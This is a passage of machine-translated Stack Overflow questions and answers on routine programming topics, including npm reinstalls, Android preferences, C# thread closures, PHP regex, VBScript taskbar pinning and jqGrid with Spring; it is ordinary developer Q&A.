2）你是对的，我相信资源驱动器类似于我们在Windows端看到的D：/驱动器。这是临时的暂存空间。驱动器本身也是一个 VHD，并不位于 BLOB 存储中，而是位于运行 VM 的物理服务器上。对于 Windows，这是保存内存页面文件的位置，以尽可能降低页面文件访问的延迟。他们非常坚持这是一个非持久驱动器这一事实。在您的情况下，如果您所做的只是关闭实例，这可能会一直存在。当实例重新启动时，它仍然在同一台物理服务器上，因此为它分配了相同的本地资源，因此您放置在那里的数据仍然存在。如果实例被重新部署，数据将不再存在。

3）您看到的磁盘（OS Disk 和 Data Disk）都作为 Page BLOBS 存储在 BLOB 存储中。这些磁盘的存储成本与实际运行 VM 的每小时费用是分开的。您还需要支付存储事务以在这些磁盘运行时访问这些磁盘上的数据。从[定价页面](http://www.windowsazure.com/en-us/pricing/details/#header-3)查看此报价：

> 每次部署虚拟机时都会对计算小时数进行收费，无论它是否正在运行。计算时间不包括与在 Windows Azure 虚拟机中运行的映像相关的任何 Windows Azure 存储成本。这些费用单独计费。

4）我相信您看到的资源驱动器是 D:/ 驱动器等效项，而不是您指向的本地资源空间。您所指出的是专门讨论在云服务（或以前称为托管服务）中运行时访问本地空间，因此使用 Web 或 Worker 角色。我不确定在使用虚拟机时是否同样适用。除了使用 Windows 时的页面文件之外，我相信在为数据或操作系统磁盘设置数据缓存时也会使用一些资源空间，这也会减少您拥有的空间量。这是我的猜测。

您可能还想了解操作系统和数据驱动器的缓存选项和限制。Michael Washam 在一篇[博](http://michaelwasham.com/2012/06/08/understanding-windows-azure-virtual-machines/)文中谈到了这一点。

# node.js - 如何使用 npm 重新安装应用程序的依赖项？

> ID：12866494
> 
> 赞同：487
> 
> 时间：2012-10-12T20:18:08.007
> 
> 标签：node.js, npm

有没有一种简单的方法来重新安装我的应用程序所依赖的*所有*包（即它们在我的应用程序 node_modules 文件夹中）？

* * *

## 回答 #1

> 赞同：797
> 
> 时间：2012-10-12T20:21:43.433

我能看到的最简单的方法是删除`node_modules`文件夹并执行`npm install`.

* * *

## 回答 #2

> 赞同：125
> 
> 时间：2012-10-12T20:39:27.993

正确的方法是执行`npm update`。这是一个非常强大的命令，它会更新丢失的软件包并检查是否可以使用已安装的较新版本的软件包。

阅读[NPM 简介](http://smalljs.org/package-managers/npm/)以了解您可以使用 npm 做什么。

* * *

## 回答 #3

> 赞同：93
> 
> 时间：2017-03-01T14:19:20.177

大多数时候我使用以下命令来实现所有节点模块的完全重新安装（确保您在项目文件夹中）。

```
rm -rf node_modules && npm install 
```

您也可以`npm cache clean`在删除`node_modules`文件夹后运行，以确保没有任何缓存的依赖项。

* * *

## 回答 #4

> 赞同：77
> 
> 时间：2017-05-15T08:24:06.990

`npm`更新了 CLI 命令`install`并添加了`--force`标志。

```
npm install --force 
```

即使磁盘上存在本地副本， (or ) 参数也会强制获取远程`--force`资源`-f`。`npm`

看[`npm install`](https://docs.npmjs.com/cli/install)

* * *

## 回答 #5

> 赞同：72
> 
> 时间：2020-03-13T14:00:06.697

你可以用一个简单的命令来做到这一点：

```
npm ci 
```

这是文档的摘录[`npm ci`：](https://docs.npmjs.com/cli/ci)

> 简而言之，使用`npm install`和之间的主要区别`npm ci`是：
> 
> *   该项目必须具有现有的`package-lock.json`或`npm-shrinkwrap.json`.
> *   如果包锁中的依赖项与 中的依赖项不匹配`package.json`，`npm ci`将退出并出现错误，而不是更新包锁。
> *   `npm ci`一次只能安装整个项目：无法使用此命令添加单个依赖项。
> *   如果 a`node_modules`已经存在，它将在`npm ci`开始安装之前自动删除。
> *   它永远不会写入`package.json`或任何包锁：安装基本上被冻结。

* * *

## 回答 #6

> 赞同：20
> 
> 时间：2017-07-27T05:50:28.050

您可以使用 npm 中的[重新安装模块](https://www.npmjs.com/package/reinstall)。

安装后，可以使用以下命令：

```
reinstall 
```

与手动删除`node_modules`文件夹和制作的唯一区别`npm install`是该命令会自动清除 npm 的缓存。因此，您可以在一个命令中执行三个步骤。

**upd：** `npx reinstall`是一种无需全局安装包即可运行此命令的方法（仅适用于 npm5+）

* * *

## 回答 #7

> 赞同：17
> 
> 时间：2020-10-27T10:19:55.877

从 npm cli **v6.5.0 开始**，您可以使用 backronym：

```
npm clean-install 
```

#### 资料来源：

[https://github.com/npm/cli/releases/tag/v6.5.0](https://github.com/npm/cli/releases/tag/v6.5.0) [https://github.com/npm/cli/commit/fc1a8d185fc678cdf3784d9df9eef9094e0b2dec](https://github.com/npm/cli/commit/fc1a8d185fc678cdf3784d9df9eef9094e0b2dec)

* * *

## 回答 #8

> 赞同：6
> 
> 时间：2020-07-27T05:19:59.973

删除node_module并通过命令重新安装

```
rm -rf node_modules && npm i 
```

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2019-10-17T13:17:03.207

对于 Windows，您可以使用

```
(if exist node_modules rmdir node_modules /q /s) && npm install 
```

删除`node_modules`目录然后执行`npm install`。安装前删除可确保重新安装所有软件包。

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2020-02-06T20:31:24.770

按照此步骤重新安装节点模块并更新它们

即使 node_modules 文件夹不存在也可以工作。现在同步执行以下命令。您也可以使用“npm update”，但我认为这是首选方式

```
npm outdated // not necessary to run this command, but this will show outdated dependencies

npm install -g npm-check-updates // to install the "ncu" package

ncu -u --packageFile=package.json // to update dependencies version in package.json...don't run this command if you don't need to update the version

npm install: will install dependencies in your package.json file. 
```

如果您对 package.json 文件中的依赖项版本没问题，则无需执行这些步骤，只需运行

```
 npm install 
```

# android - 首选项活动设置更改不会坚持

> ID：12866497
> 
> 赞同：3
> 
> 时间：2012-10-12T20:18:16.470
> 
> 标签：android, sharedpreferences, preferenceactivity

到目前为止，我已经记录了可能 6 个小时与 Android 偏好作斗争，包括查看和尝试许多 stackoverflow 建议。我最近的问题是，我从偏好活动中所做的更改并没有延续到我的主要活动中。我已经提炼了代码。

主要活动：

```
public class MainActivity extends Activity {

    /*...*/

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        /*...*/
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item)
    {
        super.onOptionsItemSelected(item);
        switch(item.getItemId())
        {
        case R.id.menu_settings:
            startActivity(new Intent(this, PrefsActivity.class));
            return true;
        }
        return false;
    }

    @Override
    public void onStart()
    {
        super.onStart();

        SharedPreferences prefs = getSharedPreferences("app_prefs", MODE_PRIVATE);
        int somePrefValue = prefs.getInt("somePrefKey", 1);
        /*...*/
    }
} 
```

偏好活动：

```
public class PrefsActivity extends PreferenceActivity {

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        addPreferencesFromResource(R.xml.app_prefs);
    }
} 
```

偏好资源：

```
<?xml version="1.0" encoding="utf-8"?>
<PreferenceScreen xmlns:android="http://schemas.android.com/apk/res/android">

    <PreferenceCategory android:title="Some Category">

        <EditTextPreference
            android:key="somePrefKey"
            android:title="Some Preference"
            android:defaultValue="1"
            android:numeric="integer" /> 

    </PreferenceCategory>

</PreferenceScreen> 
```

万一这很重要，我在 4.1 中遇到了这个问题，无论是在模拟器上还是在 Nexus 7 上。

`<VENT>`作为记录，以下是我迄今为止根据偏好打过（并赢得过）的战斗：

1.  XML 首选项文件在 Eclipse 树中的位置以及如何调用它。
2.  如何强制首选项活动将值限制为整数或浮点数。
3.  在 XML 中将首选项值指定为整数或浮点数不会使首选项成为整数或浮点数——它仍然是一个字符串。
4.  尽管有几种方法采用共享首选项文件的名称，但实际加载文件的唯一方法是 addPreferencesFromResource()，仅来自 PreferenceActivity。我必须在 XML 和第一个 prefs getter 中对默认值进行冗余编码，除非我解析 XML。

尽管阅读了官方的 Android 文档以获取首选项，并且阅读了三本不同书籍中有关使用首选项的章节，但我还是遇到了这些问题。Android 文档通常都很好，但考虑到我（持续的）麻烦和大量关于此的 stackoverflow 问题，我认为这部分需要一些工作。`</VENT>`

感谢您为我的最新问题提供的任何帮助。

PS 我意识到非片段方法现在已被弃用，但我是 Android 新手，并且生产原型的截止日期很紧，该原型不需要在我的 Nexus 7 平板电脑上运行。我更喜欢简单，尽管现在看起来我没有节省任何时间。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-12T20:58:00.077

您似乎在 main 活动中使用了非默认 SharedPreferences `"app_prefs"`，但您的 PreferenceActivity 没有引用它，并且可能存储到默认 SharedPreferences 中。

您**应该**：

1.  在 Main 活动中使用默认的 SharedPreferences，而不是命名一个：（也按照 louielouie 的建议移动到 onResume）

    ```
    @Override
    public void onResume()
    {
        super.onResume();

        SharedPreferences prefs = 
           PreferenceManager.getDefaultSharedPreferences(getApplicationContext());

        int somePrefValue = Integer.valueOf(prefs.getString("somePrefKey", "1"));
        /*...*/
    } 
    ```

    **或者**

2.  告诉您的 PreferenceActivity 您要使用的 SharedPreferences 的名称：

    ```
    public class PrefsActivity extends PreferenceActivity {

        @Override
        public void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            getPreferenceManager().setSharedPreferencesName("app_prefs"); //ADD ME
            addPreferencesFromResource(R.xml.app_prefs);
        }
    } 
    ```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-12T20:46:14.800

我认为该代码片段的问题在于您使用的是 onStart，当您转到 PrefsActivity 然后返回 MainActivity 时可能不会调用它。相反，您想像这样使用 onResume() ：

```
@Override
public void onResume()
{
    super.onResume();

    SharedPreferences prefs = getSharedPreferences("app_prefs", MODE_PRIVATE);
    int somePrefValue = prefs.getInt("somePrefKey", 1);
    /*...*/
} 
```

当您返回 MainActivity 时，肯定会调用 onResume。

[http://developer.android.com/reference/android/app/Activity.html#ActivityLifecycle](http://developer.android.com/reference/android/app/Activity.html#ActivityLifecycle)上的生命周期图很好地说明了这一点。

# google-street-view - 多层街景

> ID：12866498
> 
> 赞同：1
> 
> 时间：2012-10-12T20:18:18.953
> 
> 标签：google-street-view

通过在谷歌街景中使用自定义全景图，我可以构建多层视图吗？正如谷歌在街景文档中解释的那样，我想通过嵌入我自己的图像而不是谷歌来使用谷歌街景，让某物像一个虚拟城市。

# asp.net-mvc - 多个MVC项目结构

> ID：12866506
> 
> 赞同：4
> 
> 时间：2012-10-12T20:18:48.583
> 
> 标签：asp.net-mvc, model-view-controller

我需要帮助设计用于团队环境的 MVC 结构吗？以下是对我们正在做的事情的简短说明：

*   我们有不同的部门将迁移到 Web (MVC)。例如，我们有一个 Census Dept、Pipeline Dept 和 Compset Dept 等。

选项：

1.  我可以在 Visual Studio 中为每个模块设置一个普通的 MVC 解决方案。所以我可以有一个用于人口普查的 VS 解决方案，一个用于管道等。这一切都很好，但我希望有一个可以跨项目使用的共享视图（类似于母版页）。在这种情况下如何工作？
2.  我可以为每个部门设置一个具有区域的 MVC 应用程序。不错的选择。它解决了我的共享视图问题。但是，当我们完成时，我最终可能会得到 12-15 个不同的区域。这是一个巨大的解决方案中的许多子文件夹和代码。更不用说我可能想将我的模型和存储库分离到他们自己的项目中。甚至可以使用区域来处理吗？
3.  如果对此有更好的想法，我将不胜感激。

我们有 8 到 10 名开发人员将继续开发这个应用程序，所以我只想确保我拥有最好的结构。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-12T20:45:20.547

我认为这里没有“正确”的答案，基本上它归结为您认为随着时间的推移最容易构建和维护的东西。所以这就是我要做的。

将模块组合成更易于管理的单元，并将这些单元放在模块将成为区域的不同网站项目中。如果视图共享是这里最重要的事情，那么这将是您将模块分组到具有不同区域的网站的标准。此外，如果他们分享一些观点，那么他们在逻辑上也或多或少相似，所以你最终也会按照他们的逻辑含义对它们进行分组。然后，您可以将它们作为解决方案中的不同项目，或完全不同的解决方案。

似乎还有一种方法可以[使用来自不同项目的视图](http://www.chrisvandesteeg.nl/2010/11/22/embedding-pre-compiled-razor-views-in-your-dll/)。我个人从来没有这样做过，链接是谷歌快速搜索给我的，所以一定要详细阅读。这可以使您的视图可在所有网站上重复使用。

关于模型和存储库，我会将它们放在一个完全独立的项目中，然后所有网站都会引用它们。最近，我倾向于在不考虑任何“客户端”的情况下构建我的模型和存储库，所以我通常将它们放在一个完全独立的项目中，并且我尝试构建它们以便它们可以轻松地被网站、网络使用服务或桌面应用程序。

我希望这会有所帮助，但正如我所说，这绝不是一个正确的答案（它可能是完全错误的，所以如果有人有更好的想法，请分享）。顺便说一句，如果您有 8 到 10 名开发人员来开发它，请务必询问他们。来自聪明人的一堆不同意见往往会融入有用的想法。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-12T21:35:23.787

您可以通过多种方式真正做到这一点。

一种选择是使用[Portable Areas](http://lostechies.com/erichexter/2009/11/01/asp-net-mvc-portable-areas-via-mvccontrib/)，其中每个区域都是它自己的程序集。这可以解决您的项目大小问题。

# loops - 循环遍历数据结构并比较值vb.net

> ID：12866507
> 
> 赞同：1
> 
> 时间：2012-10-12T20:18:52.053
> 
> 标签：loops, data-structures, compare, vb.net-2010

这个非常重要。

情况：我正在构建一个带有注册设施的“游戏”。我正在使用数据结构和数组。我已经拥有了我需要的一切，但登录。我需要一个循环，它将：

*   循环遍历数组/记录
*   将数组/记录中的内容与用户在文本框中输入的内容进行比较
*   运行其他代码

这些是我的存储方法：

```
Public Structure typRegistrationDetails
    Dim strUsername As String
    Dim strPassword As String
End Structure

Public Shared strUsers(0 To 2) As typRegistrationDetails 
```

用户数量目前限制为 3；每个 strUsers 包含 strUsername 和 strPassword。

我已经写了注册代码，需要看的告诉我。

所以现在，我需要一个循环来遍历上述结构并将它们的值与用户输入的值进行比较。

我的意思是如果 txtUsername.Text （用户输入）和 txtPassword.Text （用户输入）匹配 strUsers(index) 之一然后做一些事情，否则做其他事情。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-02T16:40:49.733

像这样的东西？

```
Dim found As Boolean = False
For Each u As typRegistrationDetails In strUsers
    If u.strUserName = strUserName AndAlso
       u.strPassword = strPassword Then
        found = True
        Exit For
    End If
Next
If found Then
    ' do something
Else
    ' do something else
End If 
```

# vbscript - 便笺上的 FolderItemVerb.DoIt 或截图工具导致“找不到指定的文件”

> ID：12866510
> 
> 赞同：1
> 
> 时间：2012-10-12T20:19:10.650
> 
> 标签：vbscript, windows-7-x64, taskbar

`DoIt`使用 VBScript 尝试将“便笺”或“截图工具”快捷方式固定到任务栏，当我调用该方法时，我收到错误消息“系统找不到指定的文件” 。但是，如果我固定任何其他快捷方式（例如 Caclulator、记事本、Internet Explorer、MS Word），则该脚本可以完美运行。

```
Dim Application, FileSystem, Shell, PinnedFolder, PinnedItem, Verb, Shortcut
Set Application = CreateObject("Shell.Application")
Set FileSystem = CreateObject("Scripting.FileSystemObject")
Set Shell = CreateObject("WScript.Shell")
Set Shortcut = FileSystem.GetFile(Shell.ExpandEnvironmentStrings("%ProgramData%\Microsoft\Windows\Start Menu\Programs\Accessories\Sticky Notes.lnk"))
Set PinnedFolder = Application.Namespace(Shortcut.ParentFolder.Path)
Set PinnedItem = PinnedFolder.ParseName(Shortcut.Name)

For Each Verb In PinnedItem.Verbs
    If "Pin to Tas&kbar" = Verb.Name Then
        Verb.DoIt
    End If
Next 
```

例如，如果我将路径更改为`"%ProgramData%\Microsoft\Windows\Start Menu\Programs\Accessories\Calculator.lnk"`then 它不会**引发**错误，并且 Calculator 的快捷方式已成功固定到任务栏。

我找不到任何理由只在这两个快捷方式上失败。我已经尝试重新创建快捷方式，将它们移动到不同的位置，并且我已经验证了快捷方式本身在双击时是否有效。有谁知道为什么会发生这种情况或有任何我没有尝试过的想法？

******编辑* *******

 **现在已经在另外两台 Windows 7 64 位 PC 和一台 Windows 7 32 位 PC 上进行了测试。所有这些都成功地固定了 Sticky Notes 应用程序。至少有一台 Windows 7 64 位 PC 和 32 位 PC 与受影响的 PC 具有相同的设置、软件和环境。然而，问题仍然存在于原来的 PC。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-14T07:35:29.467

您的代码适用于我的 Windows7 x64 系统。但是，试试这个（也适用于我的）。

```
Dim Application, FileSystem, Shell, PinnedFolder, PinnedItem, Verb, Shortcut
Set Application = CreateObject("Shell.Application")
Set FileSystem = CreateObject("Scripting.FileSystemObject")
Set Shell = CreateObject("WScript.Shell")
Set Shortcut = FileSystem.GetFile(Shell.ExpandEnvironmentStrings("%windir%\system32\StikyNot.exe"))
Set PinnedFolder = Application.Namespace(Shortcut.ParentFolder.Path)
Set PinnedItem = PinnedFolder.ParseName(Shortcut.Name)

For Each Verb In PinnedItem.Verbs
    If "Pin to Tas&kbar" = Verb.Name Then
        Verb.DoIt
    End If
Next 
```

如果这不起作用，请尝试以管理员身份运行它。**

# c# - 将列表传递给线程

> ID：12866512
> 
> 赞同：1
> 
> 时间：2012-10-12T20:19:19.133
> 
> 标签：c#, multithreading, .net-4.0

我有一个接受`List<int>`被调用的方法`DoWork`。我有一个*巨大* `List<int> Ids`的. 我将庞大的列表拆分为 4 个子列表：

```
List<List<int>> t = (List<List<int>>)SplitColumn<int>(Ids); 
```

（从[将列表拆分为子列表](https://stackoverflow.com/questions/11670325/how-to-split-into-sublists-using-linq)`SplitColumn`的答案略有修改）。

我暂停了程序并`t`用调试器检查，它是四个列表，完全按照我的预期划分。

然后，我想要做的是产生四个线程（每个子列表一个）。我遇到问题的部分是通过四个列表。我遇到了超出范围的问题，我不确定这里发生了什么：

```
 List<Thread> threads = new List<Thread>();

        for(int i = 0; i < t.Count; i++) 
        {
            threads.Add(new Thread(() => DoWork(t[i])));
        }

        foreach (Thread thread in threads)
        {
            thread.Start();
        }

        foreach (Thread thread in threads)
        {
            thread.Join();
        } 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-10-12T20:23:27.997

这是一个经典，叫做捕获循环变量。

`i`在这段代码中，所有线程共享同一个变量。到线程运行时，主线程将产生`i == t.Count`，因此范围异常。

```
 for(int i = 0; i < t.Count; i++) 
    {
        threads.Add(new Thread(() => DoWork(t[i])));
    } 
```

要解决这个问题：

```
 for(int i = 0; i < t.Count; i++) 
    {
        int copy = i;
        threads.Add(new Thread(() => DoWork(t[copy])));
    } 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-12T20:23:12.133

在这种情况下，捕获的变量不是您的朋友。尝试：

```
 for(int i = 0; i < t.Count; i++) 
        {
            int j=i;
            threads.Add(new Thread(() => DoWork(t[j])));
        } 
```

发生的事情是，当您的原始文件运行完成时，`i==t.Count`. 而当 DoWork 执行时，你实际上是在做`t[t.Count]`. 不好！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-12T20:24:58.353

您可以在启动线程时传入一个对象。因此，创建一个接收普通旧对象的 DoWork 重载。然后进行下面的修改。

```
 for(int i = 0; i < t.Count; i++) 
    {
        threads.Add(new Thread(DoWork));
    }

    foreach (Thread thread in threads)
    {
        thread.Start([your list right there]);
    } 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-12T20:41:47.853

正如 Henk Holterman 指出的那样，您正在关闭循环变量。我会做的是：

```
List<Thread> threads = t
    .Select(x => new Thread(() => DoWork(x)))
    .ToList(); 
```

另请参阅[关闭被认为有害的循环变量](http://blogs.msdn.com/b/ericlippert/archive/2009/11/12/closing-over-the-loop-variable-considered-harmful.aspx)。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-10-12T20:42:14.607

您可以将复杂类型发送到线程

```
public string FileSource;
public string FileName;
public ThreadPriority Priority;

public ThreadInfo(string File, ThreadPriority priority)
{
   FileSource = File;
   FileName = Path.GetFileNameWithoutExtension(File);
   Priority = priority;
}

static void Main()
{
   ThreadInfo ti = null;
   try
   {
      ti = new ThreadInfo(FileName, ThreadPriority.Normal);
      ThreadPool.QueueUserWorkItem(ThreadImageProcess.doWork, ti);
   }
   catch (Exception error)
   {
      MyEventLog.WriteEntry("Error creating Thread Pool: "+ error.StackTrace, EventLogEntryType.Error, (int)ImageProcess.MyEventID.ProcessFile, (int)ImageProcess.MyErrorCategory.Information, null);
   }
   finally
   {
      if (ti != null)
          ti = null;
   }
}

public static void doWork(object sender)
{
  string FileName = "";
  try
  {
     Thread.CurrentThread.Priority = (sender as ThreadInfo).Priority;
     FileName = (sender as ThreadInfo).FileSource;
  }
  catch (Exception error)
  {
     //send some message
  }
} 
```

# database - 如何在 WP7 中读取数据库文件？

> ID：12866519
> 
> 赞同：0
> 
> 时间：2012-10-12T20:19:38.350
> 
> 标签：database, silverlight, windows-phone-7

我有一个数据库文件，我想从我的 WP7 应用程序中读取它的值。我可以从 SQL-Lite 数据库浏览器中看到它的内容，如下图所示：

![在此处输入图像描述](../Images/7293398d99c41ded6cba52468a7a7bdc.png)

注意： 1- 此文件没有扩展名。2-我不需要更新它的值。3-如果有办法将其转换为另一个公式（例如 xml）。

谢谢。

# php - php 检查字符串的格式

> ID：12866520
> 
> 赞同：0
> 
> 时间：2012-10-12T20:19:39.283
> 
> 标签：php, regex

我正在尝试验证字符串是否格式正确。以下是一些通过的格式。这些只是随机输入的项目。

```
1abc.abc

ab2.abc

abc.abc.abt

aerj/adfa.tht 
```

之前的。可以是字母和数字符号。之后 。我试图做的检查是检查字符串的结尾。后跟不超过 4 个字母字符。我相信这可以用正则表达式来完成，但我不知道从哪里开始。

无效字符串是在句点之后包含数字、符号或超过 4 个字符的任何内容

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-12T20:21:38.053

试试这个（匹配所有字母数字/符号，但没有空格）：

```
^([\S]+)\.([A-Za-z]{0,4})$ 
```

相同，但空格匹配：

```
^(.*?)+\.([A-Za-z]{0,4})$ 
```

进一步来说：

```
if (preg_match("/^([\S]+)\.([A-Za-z]{0,4})$/", $yourStr) == 1) { } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-12T20:39:04.323

你应该使用正则表达式模式`/\.[a-zA-Z]{0,4}$/`

# asp.net-mvc - mvc3中的ckfinder重复组装错误

> ID：12866527
> 
> 赞同：1
> 
> 时间：2012-10-12T20:20:09.760
> 
> 标签：asp.net-mvc, asp.net-mvc-3

我正在尝试将 ckfinder 添加到 ckeditor 以上传图像。当我第一次构建我的项目时，我遇到了 System.Web.UI 错误，并将 System.Design 从 .NET 添加到引用中。这解决了第一个错误，但这次我得到：

```
Error   14  Duplicate 'AssemblyCompany' attribute   C:\Users\Projects\Documents\Visual Studio 2010\Projects\MvcApplication6\MvcApplication6\Properties\AssemblyInfo.cs  11  12  MvcApplication6 
```

我该如何解决这个错误？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-17T10:51:43.697

从项目中排除所有 CkFinder 程序集，然后您可以运行项目。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-11-27T11:41:04.933

对于任何有此问题的人，请检查您是否在项目中包含了一个也是项目的文件夹。

# workflow - 覆盖默认激活工作流程

> ID：12866528
> 
> 赞同：1
> 
> 时间：2012-10-12T20:20:18.427
> 
> 标签：workflow, replication, aem

我的项目目前正在运行 CQ 5.4 实现。我们有一个要求，要求我们修改现有的页面复制过程（通过 Sidekick 中的“激活页面”或通过网站控制台启动）。我有两个问题：

是否可以检查和修改附加到激活过程的代码？是否可以使用自定义代码覆盖默认激活过程？如果是这样，如何实现？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-14T19:54:48.573

可以在 /libs/foundation/workflows 检查工作流。通过将其复制到 /apps 来覆盖

# javascript - 根据另一个字段选择过滤选项集

> ID：12866535
> 
> 赞同：0
> 
> 时间：2012-10-12T20:20:43.857
> 
> 标签：javascript, jquery, dynamics-crm, dynamics-crm-2011, crm

我有一个名为 STATES 的选项集。另一个名为 RESTAURANTS。

我的目标是根据选择的状态过滤餐厅选项集。

我目前的方法是设计选项的值，其中：

```
States[0] = 1000
States[1] = 2000
States[2] = 3000 
```

然后，餐厅：

```
Restaurants[3] = 1003
Restaurants[30] = 2004 
```

然后，当 States 字段发生更改时，我会遍历餐厅。如果餐厅值不在所选状态的范围内，我调用removeOption(Restaurant.value)。

我的问题是，如果状态更改不止一次，每个值都将被删除，因为我没有“刷新”选项集或“replaceOption”。

有什么方法可以显示通过 removeOption 删除所有 optionSet 值，通过 javascript？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-14T21:10:21.827

A far better design would be to have two custom entities: one for states, one for restaurants. The restaurants entity would have a required (mandatory) lookup field (for a N:1 relationship) to States. Add lookups to both State and Restaurant where you would have had the picklists. You can then use built-in feature to filter one lookup based on the value of another. No code, no stress, almost zero maintenance.

Don't forget that you need to make sure users have "append to" privileges on

You can set up records for all the states easily enough by importing, and don't let users amend these. Import restaurants including the State information. You can use security roles to determine which users are allowed to create new restaurant records in future to make this really easy to keep up to date without it being an admin job.

I know this does not answer the question you asked about filtering picklists, but I am certain it answers your implied business requirement behind that.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-13T09:08:46.850

您要做的是创建一个依赖选项列表。SDK 中有一个示例，在[这篇针对 Crm 4 的博客文章](http://blogs.msdn.com/b/crm/archive/2009/06/08/new-dependent-picklist-sample.aspx)和[这篇针对 2011 的 MSDN 文章中进行了解释](http://msdn.microsoft.com/en-us/library/gg594433.aspx)。

# jqgrid - 带有jqgrid的spring 3，我正在尝试从控制器将数据加载到选择选项中并且无法填充

> ID：12866543
> 
> 赞同：1
> 
> 时间：2012-10-12T20:21:40.160
> 
> 标签：jqgrid

我正在使用带有 jqgrid 的 spring 3 一切工作正常，除了从控制器将数据加载到选择选项中我尝试加载到 jsion Array 对象并发送到 jsp 页面，但我无法加载值以使用选择选项

```
(editoptions: {dataUrl:"location/role.do") 
```

请查看我的代码并帮助我

**我的控制器类是**

```
@Controller
@RequestMapping("/location")
public class AddCenterLocation {

    @Autowired
    private RecoupService recoupService;

    @RequestMapping(method = RequestMethod.GET)
    public @ResponseBody
    CustomCenterLocationResponse getAll() {
        List<? extends CenterLocation> users = recoupService.getCenter();
        response.setRows(users);
        response.setRecords(String.valueOf(users.size()));
        response.setPage("1");
        response.setTotal("10");
        return response;
    }

    @RequestMapping(value = "/role", method = RequestMethod.GET)
    public @ResponseBody
    CustomGenericResponse role(HttpServletRequest request, HttpServletResponse response) {
        JSONObject jsonArray = new JSONObject();
        try {
            List<CenterLocation> users = recoupService.getCenter();
            for (CenterLocation harbour : users) {
                jsonArray.put(harbour.getCenterId(), harbour.getCenterAddress());
            }
            response.getWriter().write(jsonArray.toString());
        } catch (Exception exception) {
            System.out.println("error is " + exception);
        }
        return null;

    } 
```

**这是我的jsp页面**

```
jq(function() {
    jq("#grid").jqGrid({
        url:'location.do',
        datatype: 'json',
        mtype: 'GET',
        colNames:['Id', 'Center Name', 'Address','Country','State','City','Pin Code','Land Line No','Mobile No','Role'],
        colModel:[
            {name:'id',index:'id', width:55,editable:false,editoptions:{readonly:true,size:10},hidden:true},
            {name:'centerName',index:'centerName', width:100,editable:true, editrules:{required:true}, editoptions:{size:10}},
            {name:'centerAddress',index:'centerAddress', width:100,editable:true, editrules:{required:true}, editoptions:{size:10}},
            {name:'centerCountry',index:'centerCountry', width:100,editable:true, editrules:{required:true}, editoptions:{size:10}},
            {name:'centerState',index:'centerState', width:100,editable:true, editrules:{required:true}, editoptions:{size:10}},
            {name:'centerCity',index:'centerCity', width:100,editable:true, editrules:{required:true}, editoptions:{size:10}},
            {name:'centerPinCode',index:'centerPinCode', width:100,editable:true, editrules:{required:true}, editoptions:{size:10}},
            {name:'landLineNo',index:'landLineNo', width:100,editable:true, editrules:{required:true}, editoptions:{size:10}},
            {name:'mobileNo',index:'mobileNo', width:100,editable:true, editrules:{required:true}, editoptions:{size:10}},
            { name: 'Slger', index: 'Slger', editable: true, edittype: "select",
                editoptions: {dataUrl:"location/role.do",
                    buildSelect: function (data) {
                        var response = jQuery.parseJSON(data.responseText);
                        var s = '<select>';
                        if (response && response.length) {
                            for (var i = 0, l = response.length; i < l; i++) {
                                var ri = response[i];
                                s += '<option value="' + ri + '">' + ri + '</option>';
                            }
                        }
                        return s + "</select>";
                    }
                }
            }

        ],
        postData: { 

        },
        rowNum:20,
        rowList:[20,40,60],
        height: 400,
        autowidth: true,
        rownumbers: true,
        pager: '#pager',
        sortname: 'id',
        viewrecords: true,
        sortorder: "asc",
        caption:"Users",
        emptyrecords: "Empty records",
        loadonce: false,
        loadComplete: function() {
        },
        jsonReader : {
            root: "rows",
            page: "page",
            total: "total",
            records: "records",
            repeatitems: false,
            cell: "cell",
            id: "id"
        }
    });
    jq("#grid").jqGrid('navGrid','#pager',
    {edit:false,add:false,del:false,search:true},
    { },
    { },
    { }, 
    { 
        sopt:['eq', 'ne', 'lt', 'gt', 'cn', 'bw', 'ew'],
        closeOnEscape: true, 
        multipleSearch: true, 
        closeAfterSearch: true }
);

    jq("#grid").navButtonAdd('#pager',
    {   caption:"Add", 
        buttonicon:"ui-icon-plus", 
        onClickButton: addRow,
        position: "last", 
        title:"", 
        cursor: "pointer"
    } 
);

    jq("#grid").navButtonAdd('#pager',
    {   caption:"Edit", 
        buttonicon:"ui-icon-pencil", 
        onClickButton: editRow,
        position: "last", 
        title:"", 
        cursor: "pointer"
    } 
);

    jq("#grid").navButtonAdd('#pager',
    {   caption:"Delete", 
        buttonicon:"ui-icon-trash", 
        onClickButton: deleteRow,
        position: "last", 
        title:"", 
        cursor: "pointer"
    } 
);

    jq("#btnFilter").click(function(){
        jq("#grid").jqGrid('searchGrid',
        {multipleSearch: false, 
            sopt:['eq']}
    );
    });

    // Toolbar Search
    jq("#grid").jqGrid('filterToolbar',{stringResult: true,searchOnEnter : true, defaultSearch:"cn"});

}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-14T00:25:59.920

**第一个jackson lib被导入lib文件夹，用于将json数据发送到jsp页面。然后创建两个 pojo 类，这仅用于演示，您可以根据需要进行更改**

公共类位置{

